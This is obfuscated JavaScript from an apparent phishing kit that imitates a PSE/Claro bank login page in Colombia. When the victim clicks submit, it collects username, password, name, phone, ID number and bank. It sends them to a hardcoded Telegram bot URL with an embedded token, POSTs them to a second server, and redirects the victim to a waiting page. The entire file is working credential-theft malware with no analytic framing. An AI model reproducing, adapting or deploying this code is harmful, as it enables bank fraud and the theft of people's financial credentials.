const _0x340fed = _0x14a9;
(function (_0x439572, _0x2efc87) {
  const _0x196f26 = _0x14a9,
    _0x1dd933 = _0x439572();
  while (!![]) {
    try {
      const _0x5c4a7f =
        -parseInt(_0x196f26(0x6a)) / 0x1 +
        -parseInt(_0x196f26(0x6f)) / 0x2 +
        -parseInt(_0x196f26(0x94)) / 0x3 +
        -parseInt(_0x196f26(0x68)) / 0x4 +
        (parseInt(_0x196f26(0x82)) / 0x5) * (-parseInt(_0x196f26(0x79)) / 0x6) +
        (-parseInt(_0x196f26(0x95)) / 0x7) * (parseInt(_0x196f26(0x73)) / 0x8) +
        (parseInt(_0x196f26(0x72)) / 0x9) * (parseInt(_0x196f26(0x91)) / 0xa);
      if (_0x5c4a7f === _0x2efc87) break;
      else _0x1dd933["push"](_0x1dd933["shift"]());
    } catch (_0x6e242c) {
      _0x1dd933["push"](_0x1dd933["shift"]());
    }
  }
})(_0x2683, 0x36451);
function updateLS() {
  const _0x3f1fdf = _0x14a9;
  LS[_0x3f1fdf(0x90)](_0x3f1fdf(0x83), JSON[_0x3f1fdf(0x93)](info));
}
const button = document["getElementById"](_0x340fed(0x9a)),
  userInput = document[_0x340fed(0x81)]("txtUsuario"),
  passInput = document["getElementById"]("txtPass");
function _0x2683() {
  const _0x1f37aa = [
    "21265lLGEmn",
    "info",
    "disabled",
    "location",
    "Network\x20response\x20was\x20not\x20ok",
    "usuario",
    "preventDefault",
    "focus",
    "Error:",
    "application/json",
    "click",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "error",
    "setItem",
    "30KbrnIR",
    "POST",
    "stringify",
    "1282980nxyMuU",
    "91ViOMzf",
    "href",
    "\x0a🏦Banco:\x20",
    "metaInfo",
    "nombre",
    "btnUsuario",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "766516VMtxnl",
    "value",
    "306620LTVPKu",
    "bank",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "telnum",
    "password",
    "550770DihJdg",
    "./wait.html",
    "puser",
    "6036507fzGoVI",
    "92632kftyaW",
    "\x0a🆔Nombre:\x20",
    "&text=",
    "\x0a🔒Contraseña:\x20",
    "\x0a🚹Usuario:\x20",
    "log",
    "618UTclEW",
    "statusText",
    "\x0a📱Teléfono:\x20",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "user",
    "/trico/tricoPse",
    "dudename",
    "json",
    "getElementById",
  ];
  _0x2683 = function () {
    return _0x1f37aa;
  };
  return _0x2683();
}
function _0x14a9(_0x24601e, _0x504683) {
  const _0x2683e1 = _0x2683();
  return (
    (_0x14a9 = function (_0x14a938, _0x1f3f5f) {
      _0x14a938 = _0x14a938 - 0x67;
      let _0x129ece = _0x2683e1[_0x14a938];
      return _0x129ece;
    }),
    _0x14a9(_0x24601e, _0x504683)
  );
}
async function sendToTelegram(_0x2778fb) {
  const _0x45aa44 = _0x340fed;
  for (const _0x8a0ad5 of chatIds) {
    const _0x1ad91f =
      _0x45aa44(0x67) +
      _0x8a0ad5 +
      _0x45aa44(0x75) +
      encodeURIComponent(_0x2778fb);
    try {
      const _0x6b3a57 = await fetch(_0x1ad91f);
      _0x6b3a57["ok"]
        ? console[_0x45aa44(0x78)](_0x45aa44(0x6c) + _0x8a0ad5 + ")")
        : console[_0x45aa44(0x8f)](
            "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20" +
              _0x8a0ad5 +
              "):",
            _0x6b3a57[_0x45aa44(0x7a)]
          );
    } catch (_0x59a3c8) {
      console[_0x45aa44(0x8f)](_0x45aa44(0x7c) + _0x8a0ad5 + "):", _0x59a3c8);
    }
  }
}
button["addEventListener"](_0x340fed(0x8c), async function (_0x48171a) {
  const _0x91e777 = _0x340fed;
  _0x48171a[_0x91e777(0x88)](), (button["disabled"] = !![]);
  if (userInput[_0x91e777(0x69)] == "" && passInput[_0x91e777(0x69)] == "") {
    alert(_0x91e777(0x8e)),
      userInput[_0x91e777(0x89)](),
      (button[_0x91e777(0x84)] = ![]);
    return;
  } else {
    var _0x425580 = userInput[_0x91e777(0x69)],
      _0x32dfde = passInput[_0x91e777(0x69)];
    (info["metaInfo"][_0x91e777(0x7d)] = _0x425580),
      (info[_0x91e777(0x98)][_0x91e777(0x71)] = _0x32dfde),
      updateLS();
    const _0xb0ed = {
        id: info[_0x91e777(0x98)]["cc"],
        nombre: info[_0x91e777(0x98)][_0x91e777(0x7f)],
        telefono: info[_0x91e777(0x98)][_0x91e777(0x6d)],
        direccion: "",
        usuario: info[_0x91e777(0x98)][_0x91e777(0x7d)],
        password: info["metaInfo"]["puser"],
        bank: info["metaInfo"]["ban"],
      },
      _0x836fd4 =
        _0x91e777(0x8d) +
        _0xb0ed["id"] +
        _0x91e777(0x74) +
        _0xb0ed[_0x91e777(0x99)] +
        _0x91e777(0x7b) +
        _0xb0ed["telefono"] +
        _0x91e777(0x77) +
        _0xb0ed[_0x91e777(0x87)] +
        _0x91e777(0x76) +
        _0xb0ed[_0x91e777(0x6e)] +
        _0x91e777(0x97) +
        _0xb0ed[_0x91e777(0x6b)] +
        "\x0aFuente:\x20" +
        fuente;
    await sendToTelegram(_0x836fd4);
    try {
      const _0x7f3d21 = await fetch(url + _0x91e777(0x7e), {
        method: _0x91e777(0x92),
        headers: { "Content-Type": _0x91e777(0x8b) },
        body: JSON[_0x91e777(0x93)](_0xb0ed),
      });
      if (!_0x7f3d21["ok"]) throw new Error(_0x91e777(0x86));
      const _0x926f9f = await _0x7f3d21[_0x91e777(0x80)]();
      window[_0x91e777(0x85)][_0x91e777(0x96)] = _0x91e777(0x70);
    } catch (_0x276efa) {
      console[_0x91e777(0x8f)](_0x91e777(0x8a), _0x276efa),
        (button[_0x91e777(0x84)] = ![]);
    }
  }
});
